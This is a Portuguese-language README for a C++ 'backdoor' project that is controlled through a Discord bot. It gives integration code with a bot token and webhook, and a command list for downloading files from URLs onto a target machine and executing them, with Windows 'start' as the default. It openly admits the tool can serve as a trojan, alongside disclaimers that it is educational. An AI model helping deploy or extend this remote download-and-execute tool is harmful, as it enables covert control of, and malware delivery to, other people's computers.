Backdoor

Este projeto é uma API pública para fins educacionais que se assemelha a um backdoor.
Você pode utilizá-la junto ao seu programa para obter acesso ao download e execução de arquivos na máquina alvo.
Isso pode ser explorado como um trojan, mas o objetivo deste projeto é puramente educacional.

Instalação de Dependências

Para rodar corretamente este programa, você precisará do DPP e do Curl. Caso esteja no Arch Linux, você pode instalá-los usando o AUR:

yay -S dpp curl

Uso do Backdoor no Código

Para utilizar o backdoor em seu aplicativo, configure o seguinte código:

#include "network.hpp"

int main(){
    std::string token = "seu_token_aqui";
    const std::string& webhook_url = "seu_webhook_aqui";
    const std::string version = "1.3";
    
    network program(token, webhook_url, version);
    program.MAIN();
    program.perfomBot();
    
    return 0;
}

⚠️ Atenção: Dependendo do sistema operacional do alvo, o comando de execução do aplicativo baixado deve ser alterado.
O padrão está configurado para Windows ("start"). Para modificar, edite o arquivo network.hpp, linha 64.

Comandos Básicos

Os comandos abaixo são utilizados para interagir com o backdoor pelo bot do Discord.

Comando de Desligamento

Desativa o bot sem desligar a máquina:

;shutDown

Modo Debugger

Ativa ou desativa o modo debugger:

;deBugger on  # Ativar
;deBugger off # Desativar

Verificar a Versão

Exibe a versão do bot:

;version

Adicionar a um Grupo

Permite adicionar a um grupo para envio de mensagens direcionadas:

;add nome_do_grupo

Baixar Arquivos

Faz o download de arquivos da internet:

;pl.png link_do_arquivo
;pl.exe link_do_arquivo
;pl.mp4 link_do_arquivo

Abrir Arquivos Baixados

Executa arquivos previamente baixados:

;op.png
;op.exe
;op.mp4

Créditos

Mostra os créditos do desenvolvedor:

;credits

Configurar o Bot

Link para configurar o bot no Discord Developers:

;devBot

Considerações Finais

Este projeto foi desenvolvido apenas para aprendizado e pesquisa.
O uso inadequado pode resultar em consequências legais.
Use com responsabilidade.

